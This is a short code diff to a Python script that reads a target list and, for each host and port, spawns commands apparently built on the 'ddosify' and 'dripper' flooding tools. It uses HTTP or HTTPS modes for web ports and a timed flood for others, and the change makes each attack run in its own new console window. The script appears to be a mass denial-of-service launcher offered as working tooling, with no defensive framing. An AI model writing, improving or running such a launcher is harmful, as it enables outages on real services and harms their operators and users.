@@ -1,4 +1,5 @@
-import os
+import subprocess
+from subprocess import Popen
 
 file_name = "..\\commands\\commands.txt"
 
@@ -51,9 +52,9 @@ dripper3 = " -t " + duration
 for item in targets:
     for port in item[1]:
         if port == '80':
-            os.system(f"{ddosify1}{item[0]}{ddosify2}HTTP{ddosify3}")
+            Popen(f"{ddosify1}{item[0]}{ddosify2}HTTP{ddosify3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
         elif port == '443':
-            os.system(f"{ddosify1}{item[0]}{ddosify2}HTTP{ddosify3}")
+            Popen(f"{ddosify1}{item[0]}{ddosify2}HTTPS{ddosify3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
         else:
-            os.system(f"{dripper1}{item[0]}{dripper2}{port}{dripper3}")
+            Popen(f"{dripper1}{item[0]}{dripper2}{port}{dripper3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
 
